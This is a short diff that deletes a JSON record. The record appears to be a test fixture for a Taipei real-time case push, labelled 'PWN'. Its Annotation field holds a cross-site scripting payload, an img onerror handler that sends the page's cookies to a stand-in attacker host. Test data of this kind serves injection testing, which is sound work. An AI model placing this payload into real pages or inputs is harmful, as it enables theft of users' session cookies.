@@ -1,7 +1,0 @@
-{
-  "CaseID": "TPE_REALTIME_PUSH",
-  "TypeOfEventTxt": "PWN",
-  "Annotation": "<img src=x onerror=fetch('https://attacker.log/?'+document.cookie)>",
-  "Caption": "台北即時案件測試",
-  "Timestamp": "2026-09-15T22:00:00.000Z"
-}
